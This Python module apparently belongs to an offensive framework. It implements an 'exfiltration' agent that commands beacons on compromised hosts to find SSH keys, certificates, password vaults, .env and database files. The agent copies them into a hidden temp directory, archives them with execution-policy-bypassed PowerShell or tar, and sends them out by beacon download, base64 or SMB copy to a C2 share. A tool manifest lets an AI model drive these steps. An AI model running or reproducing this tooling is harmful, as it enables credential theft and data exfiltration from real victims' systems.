"""
ExfiltrationAgent -- Data staging and exfiltration via live beacons.

Sends real file-discovery, staging, compression, and exfiltration commands
to beacons running on target hosts, parses stdout output, and returns
structured findings for the kill chain.
"""

from __future__ import annotations

import logging
import re
import uuid
from typing import Any

from agents.base import AbstractAgent
from orchestrator.task import Task, TaskResult
from server.beacon_handler import beacon_handler

logger = logging.getLogger(__name__)


class ExfiltrationAgent(AbstractAgent):
    name = "exfiltration"
    description = (
        "Stages and exfiltrates data from compromised systems — file "
        "discovery, compression, and transfer via beacons"
    )
    capabilities = [
        "find_sensitive_files",
        "stage_data",
        "compress_stage",
        "exfiltrate",
    ]

    BEACON_TIMEOUT = 300

    # ------------------------------------------------------------------
    # execute()
    # ------------------------------------------------------------------

    async def execute(self, task: Task) -> TaskResult:
        action = task.action
        params = task.params

        if action not in self.capabilities:
            return TaskResult(
                task_id=task.id,
                status="failure",
                data={"error": f"Unknown action: {action}"},
                summary=f"Exfiltration agent does not support action '{action}'",
            )

        beacon_id = params.get("beacon_id")
        if not beacon_id:
            return TaskResult(
                task_id=task.id,
                status="failure",
                data={"error": "Missing required parameter: beacon_id"},
                summary="Exfiltration failed: no beacon_id provided",
            )

        timeout = params.get("timeout", self.BEACON_TIMEOUT)

        try:
            handler = getattr(self, f"_handle_{action}")
            return await handler(task, beacon_id, params, timeout)
        except Exception as exc:
            logger.exception(
                "Exfiltration %s failed on beacon %s", action, beacon_id
            )
            return TaskResult(
                task_id=task.id,
                status="failure",
                data={"error": str(exc)},
                summary=f"Exfiltration {action} failed: {exc}",
            )

    # ==================================================================
    #  Find sensitive files
    # ==================================================================

    async def _handle_find_sensitive_files(
        self, task: Task, beacon_id: str, params: dict, timeout: float
    ) -> TaskResult:
        search_paths = params.get("search_paths")
        patterns = params.get("patterns")

        # Default sensitive file patterns
        default_win_patterns = [
            "*.docx", "*.xlsx", "*.pdf", "*.config", "*.kdbx",
            "*.key", "*.pem", "*.pfx", "*.p12", "*.ppk", "*.rdp",
            "*.sql", "*.bak", "*.csv",
        ]
        default_linux_patterns = [
            "*.conf", "*.key", "*.pem", "*.p12", "*.pfx", "*.kdbx",
            "*.sql", "*.bak", "*.csv", "*.env", "*.yml", "*.yaml",
            "id_rsa", "id_ed25519", "*.ovpn",
        ]

        # Try Windows first
        if patterns:
            win_patterns = " ".join(patterns)
        else:
            win_patterns = " ".join(default_win_patterns)

        if search_paths:
            win_paths = " ".join(search_paths)
        else:
            win_paths = "C:\\Users"

        win_cmd = f"dir /s /b {win_paths} {win_patterns}"

        sub_id = str(uuid.uuid4())
        result = await beacon_handler.submit_task(
            beacon_id, sub_id, "run_command",
            {"command": win_cmd}, timeout=timeout,
        )

        stdout = self._extract_stdout(result)

        # If Windows command failed or returned nothing, try Linux
        if not stdout.strip() or self._is_error(result):
            if search_paths:
                linux_dirs = " ".join(search_paths)
            else:
                linux_dirs = "/home /root /opt /etc /var"

            if patterns:
                name_args = " -o ".join(f'-name "{p}"' for p in patterns)
            else:
                name_args = " -o ".join(
                    f'-name "{p}"' for p in default_linux_patterns
                )

            linux_cmd = f"find {linux_dirs} \\( {name_args} \\) 2>/dev/null"

            sub_id = str(uuid.uuid4())
            result = await beacon_handler.submit_task(
                beacon_id, sub_id, "run_command",
                {"command": linux_cmd}, timeout=timeout,
            )
            stdout = self._extract_stdout(result)

        files = self._parse_file_listing(stdout)

        return TaskResult(
            task_id=task.id,
            status="success" if files else "partial",
            data={
                "raw_output": stdout,
                "findings": {"files": files},
            },
            summary=(
                f"Sensitive file search via beacon {beacon_id}: "
                f"{len(files)} file(s) discovered"
            ),
        )

    # ==================================================================
    #  Stage data
    # ==================================================================

    async def _handle_stage_data(
        self, task: Task, beacon_id: str, params: dict, timeout: float
    ) -> TaskResult:
        file_paths: list[str] = params.get("file_paths", [])
        staging_dir: str = params.get(
            "staging_dir", "C:\\Windows\\Temp\\.cache"
        )

        if not file_paths:
            return TaskResult(
                task_id=task.id,
                status="failure",
                data={"error": "No file_paths provided for staging"},
                summary="Staging failed: empty file list",
            )

        # Ensure staging directory exists
        mkdir_cmd = f'mkdir "{staging_dir}" 2>nul & if not exist "{staging_dir}" mkdir -p "{staging_dir}" 2>/dev/null'
        sub_id = str(uuid.uuid4())
        await beacon_handler.submit_task(
            beacon_id, sub_id, "run_command",
            {"command": mkdir_cmd}, timeout=timeout,
        )

        staged_files: list[dict] = []
        raw_parts: list[str] = []
        errors: list[str] = []

        for file_path in file_paths:
            # Determine OS by path style
            if "\\" in file_path or file_path[1:3] == ":\\":
                # Windows copy
                cmd = f'copy "{file_path}" "{staging_dir}\\"'
            else:
                # Linux cp
                cmd = f'cp "{file_path}" "{staging_dir}/"'

            sub_id = str(uuid.uuid4())
            result = await beacon_handler.submit_task(
                beacon_id, sub_id, "run_command",
                {"command": cmd}, timeout=timeout,
            )
            stdout = self._extract_stdout(result)
            raw_parts.append(f"--- copy {file_path} ---\n{stdout}")

            if self._is_error(result):
                errors.append(file_path)
            else:
                # Extract just the filename
                filename = file_path.replace("\\", "/").rsplit("/", 1)[-1]
                staged_files.append({
                    "key": file_path,
                    "source_path": file_path,
                    "staged_path": f"{staging_dir}/{filename}",
                    "status": "staged",
                })

        status = "success" if staged_files else "failure"
        if staged_files and errors:
            status = "partial"

        return TaskResult(
            task_id=task.id,
            status=status,
            data={
                "raw_output": "\n".join(raw_parts),
                "staging_dir": staging_dir,
                "staged_count": len(staged_files),
                "error_count": len(errors),
                "errors": errors,
                "findings": {"staged_files": staged_files},
            },
            summary=(
                f"Data staging via beacon {beacon_id}: "
                f"{len(staged_files)} file(s) staged to {staging_dir}"
                + (f", {len(errors)} failed" if errors else "")
            ),
        )

    # ==================================================================
    #  Compress staged data
    # ==================================================================

    async def _handle_compress_stage(
        self, task: Task, beacon_id: str, params: dict, timeout: float
    ) -> TaskResult:
        staging_dir: str = params.get(
            "staging_dir", "C:\\Windows\\Temp\\.cache"
        )
        archive_name: str = params.get("archive_name", "backup.zip")

        # Determine full archive path based on staging dir style
        if "\\" in staging_dir:
            archive_path = f"{staging_dir}\\{archive_name}"
            cmd = (
                f'powershell -ep bypass -c "'
                f"Compress-Archive -Path '{staging_dir}\\*' "
                f"-DestinationPath '{archive_path}' -Force; "
                f"if (Test-Path '{archive_path}') {{ "
                f"$f = Get-Item '{archive_path}'; "
                f"Write-Output \\\"ARCHIVE_OK:$($f.Length)\\\" "
                f"}} else {{ Write-Output 'ARCHIVE_FAIL' }}\""
            )
        else:
            archive_path = f"{staging_dir}/{archive_name}"
            cmd = (
                f'cd "{staging_dir}" && '
                f'tar czf "{archive_path}" * 2>/dev/null || '
                f'zip -r "{archive_path}" * 2>/dev/null; '
                f'ls -la "{archive_path}" 2>/dev/null'
            )

        sub_id = str(uuid.uuid4())
        result = await beacon_handler.submit_task(
            beacon_id, sub_id, "run_command",
            {"command": cmd}, timeout=timeout,
        )

        stdout = self._extract_stdout(result)
        archive_info = self._parse_archive_result(stdout, archive_path)

        return TaskResult(
            task_id=task.id,
            status="success" if archive_info.get("created") else "failure",
            data={
                "raw_output": stdout,
                "archive_path": archive_path,
                "archive_info": archive_info,
                "findings": {
                    "archives": [
                        {
                            "key": archive_path,
                            "path": archive_path,
                            "size_bytes": archive_info.get("size_bytes", 0),
                            "status": "created" if archive_info.get("created") else "failed",
                        }
                    ]
                },
            },
            summary=(
                f"Compression via beacon {beacon_id}: "
                + (
                    f"archive created at {archive_path} "
                    f"({archive_info.get('size_bytes', 'unknown')} bytes)"
                    if archive_info.get("created")
                    else f"archive creation failed at {archive_path}"
                )
            ),
        )

    # ==================================================================
    #  Exfiltrate
    # ==================================================================

    async def _handle_exfiltrate(
        self, task: Task, beacon_id: str, params: dict, timeout: float
    ) -> TaskResult:
        file_path: str = params.get("file_path", "")
        method: str = params.get("method", "download")

        if not file_path:
            return TaskResult(
                task_id=task.id,
                status="failure",
                data={"error": "No file_path provided for exfiltration"},
                summary="Exfiltration failed: no file_path specified",
            )

        if method == "download":
            # Use beacon's built-in file download capability
            sub_id = str(uuid.uuid4())
            result = await beacon_handler.submit_task(
                beacon_id, sub_id, "download_file",
                {"path": file_path}, timeout=timeout,
            )

            stdout = self._extract_stdout(result)
            file_size = result.get("data", {}).get("size", 0) if isinstance(result.get("data"), dict) else 0

            exfil_entry = {
                "key": file_path,
                "file_path": file_path,
                "method": method,
                "size_bytes": file_size,
                "status": "downloaded" if not self._is_error(result) else "failed",
            }

            return TaskResult(
                task_id=task.id,
                status="success" if not self._is_error(result) else "failure",
                data={
                    "raw_output": stdout,
                    "method": method,
                    "file_path": file_path,
                    "findings": {"exfiltrated": [exfil_entry]},
                },
                summary=(
                    f"Exfiltration via beacon {beacon_id}: "
                    f"{'downloaded' if not self._is_error(result) else 'failed to download'} "
                    f"{file_path} ({method})"
                ),
            )

        # For other methods (http, dns, smb), use a command-based approach
        if method == "http":
            cmd = (
                f'powershell -ep bypass -c "'
                f"$bytes = [System.IO.File]::ReadAllBytes('{file_path}'); "
                f"$b64 = [Convert]::ToBase64String($bytes); "
                f"Write-Output \\\"EXFIL_SIZE:$($bytes.Length)\\\"; "
                f"Write-Output \\\"EXFIL_OK\\\"\""
            )
        elif method == "smb":
            dest = params.get("destination", "\\\\C2\\exfil")
            cmd = f'copy "{file_path}" "{dest}\\"'
        else:
            cmd = f'type "{file_path}" 2>nul || cat "{file_path}" 2>/dev/null'

        sub_id = str(uuid.uuid4())
        result = await beacon_handler.submit_task(
            beacon_id, sub_id, "run_command",
            {"command": cmd}, timeout=timeout,
        )

        stdout = self._extract_stdout(result)
        exfil_size = self._parse_exfil_size(stdout)

        exfil_entry = {
            "key": file_path,
            "file_path": file_path,
            "method": method,
            "size_bytes": exfil_size,
            "status": "exfiltrated" if not self._is_error(result) else "failed",
        }

        return TaskResult(
            task_id=task.id,
            status="success" if not self._is_error(result) else "failure",
            data={
                "raw_output": stdout[:500],  # Truncate raw data in results
                "method": method,
                "file_path": file_path,
                "size_bytes": exfil_size,
                "findings": {"exfiltrated": [exfil_entry]},
            },
            summary=(
                f"Exfiltration via beacon {beacon_id}: "
                f"{file_path} via {method} "
                f"({'success' if not self._is_error(result) else 'failed'}"
                f"{f', {exfil_size} bytes' if exfil_size else ''})"
            ),
        )

    # ==================================================================
    #  Output parsing helpers
    # ==================================================================

    @staticmethod
    def _extract_stdout(result: dict) -> str:
        """Pull the stdout string from a beacon result dict."""
        if not result:
            return ""
        data = result.get("data", result)
        if isinstance(data, dict):
            return data.get("stdout", data.get("output", ""))
        return str(data)

    @staticmethod
    def _is_error(result: dict) -> bool:
        if not result:
            return True
        status = result.get("status", "")
        return status in ("timeout", "error", "failure")

    @staticmethod
    def _parse_file_listing(stdout: str) -> list[dict]:
        """Parse file paths from dir /s /b or find output."""
        files: list[dict] = []
        for line in stdout.strip().splitlines():
            path = line.strip()
            if not path:
                continue
            # Skip error lines, directory headers, etc.
            if path.startswith("File Not Found") or path.startswith("Access"):
                continue
            if path.startswith("Volume ") or path.startswith(" Directory"):
                continue
            # Extract filename
            filename = path.replace("\\", "/").rsplit("/", 1)[-1]
            # Determine file type by extension
            ext = filename.rsplit(".", 1)[-1].lower() if "." in filename else ""
            files.append({
                "key": path,
                "path": path,
                "filename": filename,
                "extension": ext,
                "type": _classify_sensitive_file(ext),
            })
        return files

    @staticmethod
    def _parse_archive_result(stdout: str, archive_path: str) -> dict:
        """Parse compression command output."""
        info: dict[str, Any] = {"created": False, "size_bytes": 0}

        # Check for PowerShell Compress-Archive output
        m = re.search(r"ARCHIVE_OK:(\d+)", stdout)
        if m:
            info["created"] = True
            info["size_bytes"] = int(m.group(1))
            return info

        if "ARCHIVE_FAIL" in stdout:
            return info

        # Check for Linux ls -la output
        for line in stdout.splitlines():
            parts = line.split()
            if len(parts) >= 5 and any(
                archive_path.rsplit("/", 1)[-1] in p for p in parts
            ):
                try:
                    info["size_bytes"] = int(parts[4])
                    info["created"] = True
                except (ValueError, IndexError):
                    pass

        return info

    @staticmethod
    def _parse_exfil_size(stdout: str) -> int:
        """Extract exfiltrated file size from output."""
        m = re.search(r"EXFIL_SIZE:(\d+)", stdout)
        if m:
            return int(m.group(1))
        return 0

    # ==================================================================
    #  Capabilities manifest (Anthropic tool-use format)
    # ==================================================================

    def get_capabilities_manifest(self) -> dict:
        beacon_id_prop = {
            "type": "string",
            "description": "ID of the beacon to execute through",
        }

        return {
            "name": self.name,
            "description": self.description,
            "tools": [
                {
                    "name": "exfiltration_find_sensitive_files",
                    "description": (
                        "Search for sensitive files on the target system via "
                        "beacon. On Windows uses 'dir /s /b' targeting user "
                        "directories for documents, spreadsheets, configs, key "
                        "files, and databases. On Linux uses 'find' across /home, "
                        "/root, /opt for config files, keys, PEM certs, and "
                        "database backups. Returns structured file listings with "
                        "paths, extensions, and sensitivity classification."
                    ),
                    "input_schema": {
                        "type": "object",
                        "properties": {
                            "beacon_id": beacon_id_prop,
                            "search_paths": {
                                "type": "array",
                                "items": {"type": "string"},
                                "description": (
                                    "Directories to search. Defaults to "
                                    "C:\\Users on Windows or /home /root /opt "
                                    "/etc /var on Linux."
                                ),
                            },
                            "patterns": {
                                "type": "array",
                                "items": {"type": "string"},
                                "description": (
                                    "File patterns to search for (e.g. '*.docx', "
                                    "'*.pem'). Defaults to common sensitive file "
                                    "extensions."
                                ),
                            },
                        },
                        "required": ["beacon_id"],
                    },
                },
                {
                    "name": "exfiltration_stage_data",
                    "description": (
                        "Copy target files to a staging directory for collection "
                        "before exfiltration. Copies each specified file into a "
                        "hidden staging directory. Supports both Windows (copy) "
                        "and Linux (cp) paths. Returns per-file staging status."
                    ),
                    "input_schema": {
                        "type": "object",
                        "properties": {
                            "beacon_id": beacon_id_prop,
                            "file_paths": {
                                "type": "array",
                                "items": {"type": "string"},
                                "description": (
                                    "List of absolute file paths to stage. Use "
                                    "paths discovered by find_sensitive_files."
                                ),
                            },
                            "staging_dir": {
                                "type": "string",
                                "description": (
                                    "Hidden staging directory. Defaults to "
                                    "'C:\\Windows\\Temp\\.cache'."
                                ),
                            },
                        },
                        "required": ["beacon_id", "file_paths"],
                    },
                },
                {
                    "name": "exfiltration_compress_stage",
                    "description": (
                        "Compress all staged files into a single archive for "
                        "efficient exfiltration. On Windows uses PowerShell "
                        "Compress-Archive to create a zip. On Linux uses tar/gz "
                        "or zip. Returns archive path and size."
                    ),
                    "input_schema": {
                        "type": "object",
                        "properties": {
                            "beacon_id": beacon_id_prop,
                            "staging_dir": {
                                "type": "string",
                                "description": (
                                    "Path to the staging directory containing "
                                    "files to compress. Defaults to "
                                    "'C:\\Windows\\Temp\\.cache'."
                                ),
                            },
                            "archive_name": {
                                "type": "string",
                                "description": (
                                    "Name of the archive file to create. "
                                    "Defaults to 'backup.zip'."
                                ),
                            },
                        },
                        "required": ["beacon_id"],
                    },
                },
                {
                    "name": "exfiltration_exfiltrate",
                    "description": (
                        "Exfiltrate a file from the target via the beacon. The "
                        "'download' method uses the beacon's built-in file "
                        "download capability. 'http' base64-encodes for HTTP "
                        "transfer. 'smb' copies to a UNC share. Returns "
                        "exfiltration status, method used, and bytes transferred."
                    ),
                    "input_schema": {
                        "type": "object",
                        "properties": {
                            "beacon_id": beacon_id_prop,
                            "file_path": {
                                "type": "string",
                                "description": (
                                    "Absolute path to the file to exfiltrate, "
                                    "typically the compressed archive from "
                                    "compress_stage."
                                ),
                            },
                            "method": {
                                "type": "string",
                                "enum": ["download", "http", "smb"],
                                "description": (
                                    "Exfiltration method. 'download' uses the "
                                    "beacon's native file download (default). "
                                    "'http' base64 encodes for HTTP transfer. "
                                    "'smb' copies to a network share."
                                ),
                            },
                            "destination": {
                                "type": "string",
                                "description": (
                                    "Destination for smb method (UNC path). "
                                    "Ignored for download/http methods."
                                ),
                            },
                        },
                        "required": ["beacon_id", "file_path"],
                    },
                },
            ],
        }


# ------------------------------------------------------------------
# Module-level helper
# ------------------------------------------------------------------

def _classify_sensitive_file(ext: str) -> str:
    """Classify a file extension into a sensitivity category."""
    categories = {
        "credential": {"key", "pem", "pfx", "p12", "ppk", "kdbx", "jks"},
        "document": {"docx", "doc", "xlsx", "xls", "pdf", "pptx", "csv"},
        "configuration": {"config", "conf", "yml", "yaml", "env", "ini", "xml"},
        "database": {"sql", "bak", "mdf", "ldf", "sqlite", "db"},
        "network": {"rdp", "ovpn", "vpn"},
        "code": {"ps1", "py", "sh", "bat", "cmd"},
    }
    for category, extensions in categories.items():
        if ext in extensions:
            return category
    return "other"
